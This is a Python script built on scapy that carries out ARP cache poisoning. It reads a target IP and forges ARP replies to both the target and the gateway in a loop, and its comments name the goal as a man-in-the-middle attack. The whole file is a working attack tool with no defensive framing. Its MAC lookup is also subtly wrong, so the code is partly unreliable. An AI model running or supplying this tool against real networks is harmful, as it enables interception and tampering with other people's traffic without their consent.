import os
import sys
import time
import threading
from scapy.layers.l2 import ARP
from scapy.sendrecv import send


def arp_poison(target_ip, gateway_ip):
    # Get MAC address of target
    target_mac = ARP(pdst=target_ip).hwsrc

    # Construct ARP packet
    arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

    # Indefinitely send packets
    while True:
        send(arp, verbose=0)
        print(f"Sent ARP packet to {target_ip} from {gateway_ip}")
        time.sleep(30)


def get_gateway_ip():
    # Determine the OS
    platform_id = sys.platform

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


if __name__ == '__main__':
    target = input("Enter the target IP: ")
    gateway = get_gateway_ip()

    # Poison the target's and gateway's ARP cache to establish a MITM attack
    t1 = threading.Thread(target=lambda: arp_poison(target, gateway))
    t2 = threading.Thread(target=lambda: arp_poison(gateway, target))

    # Simultaneously run the threads
    t1.start()
    t2.start()
